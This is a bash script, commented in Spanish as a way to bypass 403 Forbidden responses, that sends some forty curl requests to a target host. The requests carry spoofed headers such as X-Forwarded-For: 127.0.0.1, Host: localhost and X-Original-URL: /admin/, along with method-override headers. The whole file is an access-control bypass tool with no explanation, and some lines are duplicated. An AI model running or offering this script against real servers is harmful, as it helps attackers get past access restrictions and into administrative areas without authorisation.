
# Saltar 403 Forbidden  You don't have permission to access this resource.
#



echo
echo "CABECERAS"
echo
curl -k  -v -I -i --max-time 5 https://$1 -H "$1"
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Original-URL: '
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Custom-IP-Authorization: 127.0.0.1'
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Originating-IP: 127.0.0.1' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Forwarded: 127.0.0.1' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Remote-IP: 127.0.0.1' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Remote-Addr: 127.0.0.1' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-ProxyUser-Ip: 127.0.0.1' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Forwarded-For: 127.0.0.1' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Forwarded-For: 127.0.0.1:80' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Custom-IP-Authorization: 127.0.0.1:80' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Originating-IP: 127.0.0.1:80' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Remote-IP: 127.0.0.1:80' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Remote-Addr: 127.0.0.1:80' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-rewrite-url: ' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'Host: localhost' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Host: 127.0.0.1' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Forwarded-Host: 127.0.0.1' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'Content-Length: 0' -X POST 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Original-URL: /admin/console' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Rewrite-URL: /admin/console' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Original-URL: /admin/' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Rewrite-URL: /admin/' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Original-URL: /admin/' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Rewrite-URL: /admin/' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-HTTP-Method-Override: PATCH' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-HTTP-Method-Override: CONNECT' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-HTTP-Method-Override: TRACE' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-HTTP-Method-Override: HEAD' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-HTTP-Method-Override: POST' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-HTTP-Method-Override: PUT' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Forwarded-Port: 443' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Forwarded-Port: 443' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Forwarded-Port: 4443' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Forwarded-Port: 4443' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Forwarded-Port: 80' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Forwarded-Port: 8080' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Forwarded-Port: 8443' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Forwarded-Port: 8443' 









